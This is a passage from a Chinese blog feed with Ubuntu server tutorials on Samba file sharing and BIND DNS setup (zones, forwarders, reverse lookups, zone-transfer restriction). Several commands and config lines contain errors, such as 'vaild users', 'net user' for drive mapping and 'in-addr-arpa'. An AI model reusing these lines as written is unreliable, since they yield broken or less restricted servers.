class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">workgroup = WORKGROUP  <span class="comment"># [global]  工作组：net config worktation查看工作组</span></span><br><span class="line"></span><br><span class="line">[Private]<span class="comment"># 起个名(共享文件夹的名称)</span></span><br><span class="line">comment = prvivate share<span class="comment"># 描述</span></span><br><span class="line">path = /srv/private/<span class="comment"># 共享路径</span></span><br><span class="line">browseable = no<span class="comment"># 是否允许访问者可显示它这个共享文件夹(完整账号)</span></span><br><span class="line">guest ok = no<span class="comment"># 禁用来宾账号</span></span><br><span class="line">writable=yes<span class="comment"># 可读写(read only=yes)</span></span><br><span class="line">create mask = 0700 <span class="comment"># 新建文件权限</span></span><br><span class="line">vaild users=@samba<span class="comment"># 可访问共享的用户组(稍后会创建)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>2.创建用户/组/共享文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser user1</span><br><span class="line">sudo groupadd smaba  <span class="comment"># 上面配置的组的名称</span></span><br><span class="line">sudo gpasswd -a user1 samba</span><br><span class="line">sudo smbpasswd -a user1<span class="comment"># 设置用户SMB密码(不是操作系统的密码)</span></span><br><span class="line">sudo mkdir /srv/private/  <span class="comment"># 创建共享目录</span></span><br><span class="line">sudo setfacl -R -m <span class="string">"g:samba:rwx"</span> /srv/private/<span class="comment"># 设置acl访问控制列表，-m修改 (ll之后看到后面有个+号，表示有更多权限) </span></span><br><span class="line">getfacl /srv/private/  <span class="comment"># 查看权限</span></span><br><span class="line">testparm<span class="comment"># 检测</span></span><br><span class="line">sudo systemctl restart smbd.service nmbd.service</span><br></pre></td></tr></table></figure><p><strong>客户端访问</strong><br>win上可以访问Linux上的Samba文件夹, Linux上也可以访问Linux上的Samba文件夹</p><p>Linux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 图形化</span></span><br><span class="line">点击Connect to Server，输入地址：</span><br><span class="line">smb://192.168.0.130</span><br><span class="line"></span><br><span class="line"><span class="comment">#  命令行</span></span><br><span class="line">smbclient -L //192.168.0.130   <span class="comment"># 查看目标都有哪些共享信息</span></span><br><span class="line">smbclient -L //192.168.0.130 -U user1</span><br><span class="line">mount -t cifs -o username=user1  //192.168.0.130/private/public/mnt  <span class="comment"># 挂载</span></span><br></pre></td></tr></table></figure><p>Windows</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># win+R</span></span><br><span class="line">\\192.168.0.130</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令行工具来访问</span></span><br><span class="line">net user <span class="comment"># 查看会话</span></span><br><span class="line">net user \\host\private/user1 passwd</span><br><span class="line">net user \\host\private /delete  <span class="comment"># 删除已经建立的会话</span></span><br><span class="line">net user g:  \\host\private <span class="comment"># 映射为本地盘符</span></span><br><span class="line"></span><br><span class="line">net config workstation</span><br></pre></td></tr></table></figure><p>共享名称以<code>$</code>结尾的，在win上会认为隐藏共享(Linux上还是会显示)<br><img src="/ubuntu-server-文件服务/20200414155510404_5305.png" alt></p><h6 id="二-配置公开访问的Samba服务-开放共享文件件"><a href="#二-配置公开访问的Samba服务-开放共享文件件" class="headerlink" title="二. 配置公开访问的Samba服务(开放共享文件件)"></a>二. 配置公开访问的Samba服务(开放共享文件件)</h6><p>将不提供登录账号的用户映射为guest，无需输入密码  </p><p>1.配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#配置文件/etc/samba/smb.conf</span></span><br><span class="line">[Global]<span class="comment"># 起个名(共享文件夹的名称)</span></span><br><span class="line">workgroup = WORKGROUP </span><br><span class="line">security = user <span class="comment"># share已废止、Domain、ADS、Server</span></span><br><span class="line">map to guest = bad user <span class="comment"># 映射为guest</span></span><br><span class="line">guest ok = yes<span class="comment"># 允许来宾账号</span></span><br></pre></td></tr></table></figure><p>2.开放共享文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Public]</span><br><span class="line">comment = public share</span><br><span class="line">path = /srv/public/</span><br><span class="line">browseable = yes<span class="comment"># 允许看到</span></span><br><span class="line">writable = yes</span><br><span class="line">guest ok = yes</span><br></pre></td></tr></table></figure><p>3.创建共享目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p  /srv/public/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置访问列表（设置user,nobody代表guest）</span></span><br><span class="line">sudo setfacl -R -m <span class="string">"u:nobody:rwx"</span> /srv/public/</span><br><span class="line">getfacl /srv/public/  <span class="comment"># 查看权限</span></span><br><span class="line"></span><br><span class="line">testparm<span class="comment"># 检测</span></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">sudo systemctl restart smbd.service nmbd.service</span><br></pre></td></tr></table></figure><p><strong>客户端访问</strong><br>同上</p><p><strong>服务器信息</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbd --version  <span class="comment"># 查看版本</span></span><br><span class="line"></span><br><span class="line">sudo smbstatus<span class="comment"># 查看状态和连接状况</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件服务&quot;&gt;&lt;a href=&quot;#文件服务&quot; class=&quot;headerlink&quot; title=&quot;文件服务&quot;&gt;&lt;/a&gt;文件服务&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;我的就是你的 -  你的还是你的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;网络诞生最初的动因是去
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.xpshuai.cn/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.xpshuai.cn/tags/Linux/"/>
    
      <category term="ubuntu" scheme="http://www.xpshuai.cn/tags/ubuntu/"/>
    
      <category term="文件服务" scheme="http://www.xpshuai.cn/tags/%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu server-DNS服务</title>
    <link href="http://www.xpshuai.cn/ubuntu-server-DNS%E6%9C%8D%E5%8A%A1/"/>
    <id>http://www.xpshuai.cn/ubuntu-server-DNS服务/</id>
    <published>2020-04-12T13:01:58.000Z</published>
    <updated>2020-04-12T13:08:11.822Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DNS服务"><a href="#DNS服务" class="headerlink" title="DNS服务"></a>DNS服务</h1><blockquote><p>您是谁家老小</p></blockquote><h2 id="域名解析原理"><a href="#域名解析原理" class="headerlink" title="域名解析原理"></a><font color="red">域名解析原理</font></h2><p>DNS：将容易基于的主机名映射到IP地址<br><strong>计算机命名规范：</strong></p><ul><li>Netbiso名称（微软）</li><li>Hostname</li><li>DNS分布式名称系统(但是不同的dns服务器是有层级关系的，呈树状结构)</li></ul><p><strong>DNS服务结构：</strong></p><ul><li>域名          比如：sina.com.cn</li><li>FQDN(fully qualified domain names )     比如:<a href="http://www.sina.com.cn" target="_blank" rel="noopener">www.sina.com.cn</a>  即主机名(www)+域名(sina.com.cn)</li></ul><p><strong>DNS记录类型</strong></p><table><thead><tr><th>记录类型</th><th>作用</th></tr></thead><tbody><tr><td>NS</td><td>域名服务器记录(找a.com与里面的域名对应的ip的话，就要去问域名服务器,问他www的对应的主机的ip地址是多少)，一个域可以有多个域名服务器(<code>dig a.com ns</code>)</td></tr><tr><td>A</td><td>主机记录(域名解析到ip地址)</td></tr><tr><td>CNAME</td><td>别名记录(给域名指向另一个A记录的域名,可以叠加)</td></tr><tr><td>MX</td><td>邮件交换记录</td></tr><tr><td>PTR</td><td>指针记录（反向查询）</td></tr><tr><td>SOA</td><td>起始授权记录(soa记录对应的域名服务器，才是合法的)</td></tr></tbody></table><p><img src="/ubuntu-server-DNS服务/20200405094807682_18444.png" alt></p><p><strong>DNS命名空间</strong><br><img src="/ubuntu-server-DNS服务/20200405100714099_17972.png" alt><br><code>www.ubuntu.com.</code>严格来说是有点的，但是为了方便，最后面不写点也可以</p><p><strong>DNS查询：</strong> 逐级委派<br>由机构<code>LCANN</code>负责管理, 负责根域<code>.</code></p><h2 id="DNS查询寻结构"><a href="#DNS查询寻结构" class="headerlink" title="DNS查询寻结构"></a><font color="red">DNS查询寻结构</font></h2><p><strong>三种DNS服务器：</strong></p><ol><li>Master(DNS域里面中，master服务器可以修改DNS记录，在master上做得修改也会自动同步到其他slave等dns服务器) 一般只设置一台</li><li>Slave（数据文件来自master的同步）  – 前两者两种服务器都会保存dns记录类型</li><li>Cache    （不保存任何记录，一般都是运营商提供的，跟下面的dns查询有关系，意义：本个区域内有缓存了减少dns会话的流量，提高了效率，减轻了带宽占用，超出生命周期之后才会再次查询）<ol><li>TTL<br>4.Forward（转发类型的，比如会去转发给本地运营商的dns服务器(比如家用无线路由器会企业的域控)，而不是自己去进行递归查询啥的）<br><img src="/ubuntu-server-DNS服务/20200405101258270_2676.png" alt></li></ol></li></ol><p>同时是三种角色</p><h5 id="安装DNS服务"><a href="#安装DNS服务" class="headerlink" title="安装DNS服务"></a>安装DNS服务</h5><p>使用最广的DNS服务的软件包：<code>BIND（Berkley Internet Naming Daemon）</code><br>在ubuntu上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装bind(即软件包) 9是版本，dnsutils是用来检查的软件包</span></span><br><span class="line">sudo apt install bind9 dnsutils</span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS服务区只保存和解析本域各种域名记录</span></span><br><span class="line"><span class="comment"># DNS服务都包含13个根域名服务器地址   </span></span><br><span class="line">cat /etc/<span class="built_in">bind</span>/db.root    <span class="comment"># -&gt; ipv4和ipv6地址(AAAA记录)</span></span><br><span class="line"><span class="comment"># 事实分布于世界的数百台根域服务器，不只是13个（国内是有根域服务器的）</span></span><br></pre></td></tr></table></figure><p><strong>DNS服务器的DNS服务器配置</strong><br>自己做迭代<br>指定递归域名服务器（自建尽量禁用其他地址来连接我们递归查询功能, 除非查询的是域内的域名）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 见 DNS主备部署</span></span><br></pre></td></tr></table></figure><p><strong>DNS默认服务端口</strong><br>TCP 53  / UDP 53</p><blockquote><p>这里是以<code>Bind</code>软件包为例</p></blockquote><p><strong>还有其他软件包：</strong></p><ol><li>Djbdns<ul><li>衍生版本：Dbndns, ndjbsns</li></ul></li><li>dhamasq<ul><li>DNS + DHCP打包的轻量解决方案 –&gt; 经常用于<code>无线渗透，搭建无线AP</code><br>3.PowerDNS</li><li>模块化开源DNS服务器软件</li></ul></li></ol><h2 id="DNS主备部署"><a href="#DNS主备部署" class="headerlink" title="DNS主备部署"></a><font color="red">DNS主备部署</font></h2><p>对于dns服务器本身的dns地址可以执行运营商等的地址</p><h3 id="正向区域"><a href="#正向区域" class="headerlink" title="正向区域"></a><font color="green">正向区域</font></h3><h4 id="配置Master-DNS服务器"><a href="#配置Master-DNS服务器" class="headerlink" title="配置Master DNS服务器"></a>配置<code>Master</code> DNS服务器</h4><h6 id="执行区域文件（正向区域-–-gt-域名解析为ip）"><a href="#执行区域文件（正向区域-–-gt-域名解析为ip）" class="headerlink" title="执行区域文件（正向区域 –&gt; 域名解析为ip）"></a>执行区域文件（正向区域 –&gt; 域名解析为ip）</h6><blockquote><p>企业内部自用， 一般一个域中会有两个DNS服务器</p></blockquote><p>1.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># zone定义一个区域， type类型，指定存具体记录的文件</span></span><br><span class="line">zone <span class="string">"lab.com"</span>&#123;</span><br><span class="line"><span class="built_in">type</span> master;</span><br><span class="line">file <span class="string">"/etc/bind/db.lab.com"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.编辑区域文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拷贝一个现有的区域文件模板，进行修改(也可手动创建)</span></span><br><span class="line">cp db.local db.lab.com</span><br><span class="line"></span><br><span class="line">sudo vim db.lab.com</span><br><span class="line"><span class="comment"># 文件内容</span></span><br><span class="line">; BIND data file <span class="keyword">for</span> lab.com loopback interface</span><br><span class="line">;</span><br><span class="line"><span class="variable">$TTL</span>604800    <span class="comment"># 允许缓存DNS服务器的缓存时长，单位s， 1D -&gt;一天,12h -&gt; 12小时</span></span><br><span class="line">@INSOAsoa.lab.com. root.localhost. (  <span class="comment"># @表示本域的域名，   IN -&gt;互联网记录类型， SOA起始授权记录; root.localhost.管理员邮箱地址(点就是@ -&gt;root.lab.com.), 括号多行内容</span></span><br><span class="line">      2; Serial    <span class="comment"># 版本号，如果slave的与master服务器字段值相同则不同步数据，不同则同步数据</span></span><br><span class="line"> 604800; Refresh<span class="comment"># slave向master的更新周期</span></span><br><span class="line">  86400; Retry     <span class="comment"># 重试周期</span></span><br><span class="line">2419200; Expire<span class="comment"># 最大重试时间</span></span><br><span class="line"> 604800 ); Negative Cache TTL</span><br><span class="line">;</span><br><span class="line">@INNSns1<span class="comment"># NS记录，dns域的域名服务器的名称</span></span><br><span class="line">@INA10.1.8.128<span class="comment"># 给哪个域名创建A记录，访问本机的域名解析到哪里</span></span><br><span class="line">@INAAAA::1     <span class="comment"># ipv6使用的</span></span><br><span class="line">ns1INA10.1.8.10   <span class="comment"># 给域的ns记录域名解析到哪个ip</span></span><br><span class="line">soaINA10.1.8.10</span><br><span class="line">wwwINCNAME web       <span class="comment"># 把www.lab.com解析为web.com.lab</span></span><br><span class="line">webINCNAME w3<span class="comment"># 有一个CNAME记录</span></span><br><span class="line">w3INA  10.1.8.128 <span class="comment"># 最终解析为A记录的ip</span></span><br><span class="line">@INMX 10 mx1     <span class="comment"># 优先级，数字越小优先级越高</span></span><br><span class="line">@INMX 10 mx2    </span><br><span class="line">mx1INA10.1.8.1   <span class="comment"># 再把mx的域名解析到ip</span></span><br><span class="line">mx2INA10.1.8.2</span><br><span class="line">ftp INA 10.1.8.128</span><br><span class="line">ftp INA 10.1.8.129  <span class="comment"># 同一个a记录命名指向不同的ip，不区分优先级，而是轮询</span></span><br></pre></td></tr></table></figure><p>3.重启服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart bind9</span><br><span class="line">sudo systemctl status bind9</span><br></pre></td></tr></table></figure><p>4.服务器配置检查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo named-checkconf   <span class="comment"># 检查语法错误</span></span><br><span class="line"></span><br><span class="line">sudo named-checkzone lab.com /etc/<span class="built_in">bind</span>/db.lab.com  <span class="comment"># 正向区域检查</span></span><br><span class="line"></span><br><span class="line">sudo named-checkzone lab.com /etc/<span class="built_in">bind</span>/db.lab.com  <span class="comment"># 反向区域检查</span></span><br></pre></td></tr></table></figure><p>5.客户端解析验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dig在win上没有</span></span><br><span class="line">ping lab.com</span><br><span class="line"></span><br><span class="line">dig lab.com ns @10.1.8.10  <span class="comment"># 解析ns记录，@dns服务器</span></span><br><span class="line"></span><br><span class="line">dig www.com @10.1.8.10</span><br><span class="line"></span><br><span class="line">dig com a @10.1.8.100   <span class="comment"># 不指定的话，默认就是a记录</span></span><br><span class="line"></span><br><span class="line">dig lab.com mx @10.1.8.100</span><br></pre></td></tr></table></figure><p>客户端解析验证</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nslookup在linux和win都有</span></span><br><span class="line"></span><br><span class="line">nslookup</span><br><span class="line"><span class="comment"># 设置参数 </span></span><br><span class="line">server 10.1.8.100    <span class="comment"># dns服务器</span></span><br><span class="line"><span class="built_in">set</span> q=ns   <span class="comment"># 查询记录类型</span></span><br><span class="line">lab.com<span class="comment"># 查询目标</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Windows本机hi进行dns本地缓存， 而Linux本地是不做缓存的</span></span><br><span class="line">ipconfig /displaydns   <span class="comment"># 显示本地缓存的dns记录</span></span><br><span class="line">ipconfig /flushdns     <span class="comment"># 清空本地缓存的dns记录</span></span><br></pre></td></tr></table></figure><h4 id="配置Cache-DNS服务器"><a href="#配置Cache-DNS服务器" class="headerlink" title="配置Cache DNS服务器"></a>配置<code>Cache</code> DNS服务器</h4><p>主配置文件<code>/etc/bind/named.conf</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只是一个入口文件</span></span><br><span class="line">include <span class="string">"/etc/bind/named.conf.options"</span>;  <span class="comment">#  规范: 【分号结尾】</span></span><br><span class="line">include <span class="string">"/etc/bind/named.conf.local"</span>;    <span class="comment">#</span></span><br><span class="line">include <span class="string">"/etc/bind/named.conf.default-zones"</span>;</span><br></pre></td></tr></table></figure><h6 id="全局转发DNS服务器"><a href="#全局转发DNS服务器" class="headerlink" title="全局转发DNS服务器"></a>全局转发DNS服务器</h6><p>对于不属于我们域的解析转发给其他dns服务器  （我们内部的nds服务器不知道怎么解析之后要去找谁）<br>配置转发器的文件: <code>vim /etc/bind/named.conf.options</code><br>1.全局转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">acl <span class="string">"local"</span>&#123;   <span class="comment"># options 块之前</span></span><br><span class="line">10.1.8.0/24；<span class="comment"># 本地网段(为公司内部的地址提供服务)</span></span><br><span class="line">&#125;； </span><br><span class="line">options &#123;</span><br><span class="line">recursion yes;   <span class="comment"># recursion即递归查询(公网上的dns服务器一般是禁止递归查询的)</span></span><br><span class="line">allow-recursion &#123; <span class="built_in">local</span>; &#125;;  <span class="comment"># 允许对我发起递归查询的地址范围</span></span><br><span class="line">listen-on &#123; 10.0.2.53; &#125;;  <span class="comment"># 指定侦听的地址</span></span><br><span class="line">forwarders &#123;</span><br><span class="line">9.9.9.9;  <span class="comment"># 全局性的转发器，转发给谁</span></span><br><span class="line">8.8.8.8;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sudo systemctl restart bind9.service</code></p><p>2.局部转发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zone <span class="string">"sina.com.cn"</span> &#123;   <span class="comment"># 创建一个域名</span></span><br><span class="line"><span class="built_in">type</span> forward;</span><br><span class="line">forwarders &#123;</span><br><span class="line">202.99.96.68;  <span class="comment">#局部转发，针对某个域名转发给某一个ip</span></span><br><span class="line">202.106.0.20;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>sudo systemctl restart bind9.service</code></p><p>解析过之后，就有了缓存，在一定时间内就不会转发再进行请求了  </p><h3 id="反向区域"><a href="#反向区域" class="headerlink" title="反向区域"></a><font color="green">反向区域</font></h3><h4 id="配置Master-DNS服务器-1"><a href="#配置Master-DNS服务器-1" class="headerlink" title="配置Master DNS服务器"></a>配置<code>Master DNS</code>服务器</h4><h6 id="（i反向区域-ip解析为域名-–-gt-反垃圾邮件）"><a href="#（i反向区域-ip解析为域名-–-gt-反垃圾邮件）" class="headerlink" title="（i反向区域: ip解析为域名 –&gt; 反垃圾邮件）"></a>（i反向区域: ip解析为域名 –&gt; 反垃圾邮件）</h6><p>反垃圾邮件：攻击者伪造域内邮件发送恶意文件；检查外部的邮件是否是从真正的邮件服务器发送过来的<br>1.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># zone定义一个区域， type类型，指定存具体记录的文件</span></span><br><span class="line">zone <span class="string">"8.1.10.in-addr-arpa"</span>&#123;  <span class="comment"># 反着写,这里一个网段的地址10.1.8就写为8.1.10</span></span><br><span class="line"><span class="built_in">type</span> master;</span><br><span class="line">file <span class="string">"/etc/bind/db.10.1.8"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拷贝一个模板文件</span></span><br><span class="line">sudo cp /etc/<span class="built_in">bind</span>/db.127 /etc/<span class="built_in">bind</span>/db.10.1.8</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br><span class="line">sudo systemctl restart bind9</span><br><span class="line">sudo systemctl status bind9</span><br></pre></td></tr></table></figure><p>3.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编辑反向区域配置文件</span></span><br><span class="line">vim /etc/<span class="built_in">bind</span>/db.10.1.8</span><br><span class="line"><span class="comment"># 文件内容</span></span><br><span class="line">;</span><br><span class="line">; BIND reverse data file <span class="keyword">for</span> <span class="built_in">local</span> loopback interface</span><br><span class="line">;</span><br><span class="line"><span class="variable">$TTL</span>    604800</span><br><span class="line">@   IN  SOA ns.lab.com. root.lab.com. (</span><br><span class="line">                  1     ; Serial</span><br><span class="line">             604800     ; Refresh</span><br><span class="line">              86400     ; Retry</span><br><span class="line">            2419200     ; Expire</span><br><span class="line">              604800 )   ; Negative Cache TTL</span><br><span class="line">;</span><br><span class="line">@   IN  NS  ns.lab.com.   <span class="comment"># 本地的ns记录</span></span><br><span class="line">10   IN  PTR ns.lab.com.   <span class="comment"># PTR 反向指针记录</span></span><br><span class="line">145 INPTRmx1.lab.com <span class="comment">#145即10.1.8.145</span></span><br><span class="line">2 INPTRmx2.lab.com</span><br><span class="line">2 INPTRw3.lab.com<span class="comment"># 一个ip也可以解析为多个域名</span></span><br></pre></td></tr></table></figure><p>4.检测一下反向解析是否正常</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig -x 10.1.8.2@10.1.8.2</span><br></pre></td></tr></table></figure><h4 id="配置Slave-DNS服务器"><a href="#配置Slave-DNS服务器" class="headerlink" title="配置Slave DNS服务器"></a>配置<code>Slave</code> DNS服务器</h4><ul><li>为例实现冗余容错(防止某台dns服务器宕机)，通常会为每个与安装多个Slave DNS服务器  </li><li>修改记录只能在Master DNS服务器(<code>一个域内只允许有一个</code>)上操作，通过<code>版本号</code>(Serial)通知Slave服务器同步  (所以。作为master的管理员，配置更新之后需要手动修改版本号的值)</li><li>安全考虑<ul><li>服务器全局<code>禁止区域传输</code>（同步本域所有DNS记录）</li><li>只允许指定IP，指定区域的Slave服务器进行区域传输</li><li>区域数据同步使用TCP 53端口</li></ul></li></ul><p>1.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dig进行区域传输获取信息  axfr(黑客最喜欢拿的)</span></span><br><span class="line">dig @10.1.8.10 lab.com axfr</span><br><span class="line"></span><br><span class="line"><span class="comment">## 禁止区域传输：</span></span><br><span class="line"><span class="comment"># 全局配置文件   </span></span><br><span class="line"><span class="comment"># sudo vim named.conf.options</span></span><br><span class="line"><span class="comment"># 在option中添加：</span></span><br><span class="line">allow-transfer &#123; none; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 禁用之后，不影响dig来查询某记录，只是拒绝一次性把记录拿走</span></span><br></pre></td></tr></table></figure><p>2.继续修改master服务器配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sudo vim /etc/bind/named.conf.local</span></span><br><span class="line"><span class="comment"># 在正向/反向zone字段里面都要添加</span></span><br><span class="line">allow-transfer &#123; 10.0.2.54; &#125;;  <span class="comment"># 允许10.0.2.54 -&gt; 就是slave服务器</span></span><br></pre></td></tr></table></figure><p>3.继续修改master服务器配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim /etc/bind/db.lab.com</span></span><br><span class="line"><span class="comment"># 增加一条NS记录和A记录</span></span><br><span class="line">@INNSns2</span><br><span class="line">ns2INA10.1.8.20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑反向的域名解析记录</span></span><br><span class="line"><span class="comment"># vim db.10.1.8</span></span><br><span class="line">20INPTRns2.lab.com.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure><p>4.安装slave dns服务器并配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 